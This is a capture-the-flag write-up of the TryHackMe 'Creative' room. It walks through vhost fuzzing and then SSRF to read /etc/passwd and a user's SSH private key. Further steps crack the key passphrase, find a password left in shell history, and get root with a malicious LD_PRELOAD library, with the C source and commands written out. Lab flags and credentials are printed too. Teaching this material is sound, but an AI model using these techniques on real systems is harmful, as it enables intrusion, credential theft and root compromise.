# Creative — TryHackMe Writeup

> **Difficulty:** Medium  
> **OS:** Linux (Ubuntu)  
> **Tags:** SSRF, Vhost Enumeration, LD_PRELOAD Privilege Escalation

---

## Overview

The "Creative" room on TryHackMe involves discovering a hidden subdomain with a URL testing feature, exploiting it via SSRF to access an internal file server, extracting SSH credentials, and escalating privileges through a misconfigured `LD_PRELOAD` environment variable.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV 10.145.190.99
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
```

Two open ports. Port 80 redirects to `creative.thm` — virtual host routing via nginx.

```bash
echo "10.145.190.99 creative.thm" | sudo tee -a /etc/hosts
```

---

## Enumeration

### Vhost Fuzzing

Since nginx uses virtual hosts, there may be hidden subdomains. Using `ffuf` with a subdomain wordlist:

```bash
ffuf -u http://creative.thm -H "Host: FUZZ.creative.thm" \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
  -fc 301
```

```
beta    [Status: 200, Size: 591, Words: 91, Lines: 20]
```

Found subdomain: **beta.creative.thm**

```bash
echo "10.145.190.99 beta.creative.thm" | sudo tee -a /etc/hosts
```

### Beta Subdomain

Navigating to `http://beta.creative.thm` reveals a **URL Tester** — a form that takes a URL and checks if it's alive. The server makes HTTP requests on our behalf, which is a textbook SSRF vector.

---

## Exploitation

### SSRF — Internal Port Discovery

Testing `http://127.0.0.1` confirms the server fetches URLs internally. Scanning for open internal ports:

```bash
ffuf -u http://beta.creative.thm -X POST \
  -d "url=http://127.0.0.1:FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w <(seq 1 65535) -fs 13
```

```
80    [Status: 200, Size: 37589, Words: 14867, Lines: 686]
1337  [Status: 200, Size: 1143, Words: 40, Lines: 39]
```

Port **1337** is an internal-only HTTP file server with **directory listing of the entire filesystem**.

### SSRF — Data Exfiltration

Reading `/etc/passwd` to find users:

```bash
curl -s -X POST -d "url=http://127.0.0.1:1337/etc/passwd" http://beta.creative.thm
```

Found user: **saad** (uid=1000, `/bin/bash` shell).

Extracting the SSH private key:

```bash
curl -s -X POST -d "url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa" http://beta.creative.thm
```

The key is **passphrase-protected** (`aes256-ctr` + `bcrypt`).

### Cracking SSH Key Passphrase

```bash
python3 /opt/john/ssh2john.py saad_key > saad_hash
john saad_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
sweetness        (saad_key)
```

### SSH Access

```bash
chmod 600 saad_key
ssh -i saad_key saad@10.145.190.99
# Passphrase: sweetness
```

### User Flag

```
9a1ce90a7653d74ab98630b47b8b4a84
```

---

## Privilege Escalation

### Password from .bash_history

```bash
cat ~/.bash_history
```

A leaked command reveals the user's password in plaintext:

```
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
```

### Sudo Enumeration

```bash
sudo -l
# Password: MyStrongestPasswordYet$4291
```

```
Matching Defaults entries for saad:
    env_reset, mail_badpass,
    secure_path=...,
    env_keep+=LD_PRELOAD

User saad may run the following commands:
    (root) /usr/bin/ping
```

Key finding: **`env_keep+=LD_PRELOAD`** — the `LD_PRELOAD` environment variable is preserved when running sudo commands. This allows loading a malicious shared library with root privileges.

### LD_PRELOAD Exploitation

**1. Create a malicious shared library in C:**

```bash
cat << 'EOF' > /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF
```

**How it works:**
- `_init()` executes automatically when the library is loaded
- `unsetenv("LD_PRELOAD")` prevents recursive loading
- `setresuid(0,0,0)` sets all UIDs to root
- `system("/bin/bash -p")` spawns a privileged root shell

**2. Compile:**

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
```

**3. Execute with sudo:**

```bash
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```

Root shell obtained.

### Root Flag

```bash
cat /root/root.txt
```

```
992bfd94b90da48634aed182aae7b99f
```

---

## Attack Path Summary

```
Nmap Scan
  └── Port 80: nginx → redirect to creative.thm
         └── Vhost Fuzzing (ffuf)
                └── beta.creative.thm → URL Tester
                       └── SSRF → Internal Port Scan
                              └── Port 1337: HTTP File Server (root filesystem)
                                     ├── /etc/passwd → user: saad
                                     └── /home/saad/.ssh/id_rsa → encrypted key
                                            └── ssh2john + John → passphrase: sweetness
                                                   └── SSH as saad → user.txt ✓
                                                          └── .bash_history → password leak
                                                                 └── sudo -l → LD_PRELOAD + ping
                                                                        └── Malicious .so → root shell → root.txt ✓
```

---

## Key Takeaways

1. **Vhost enumeration** is essential when nginx redirects to a domain name — hidden subdomains often expose internal tools.
2. **SSRF** can chain into full filesystem read when internal services lack authentication.
3. **Never store passwords in shell history** — `.bash_history` is a goldmine for attackers.
4. **`env_keep+=LD_PRELOAD`** in sudoers is a critical misconfiguration that trivially leads to root, regardless of which binary is allowed.
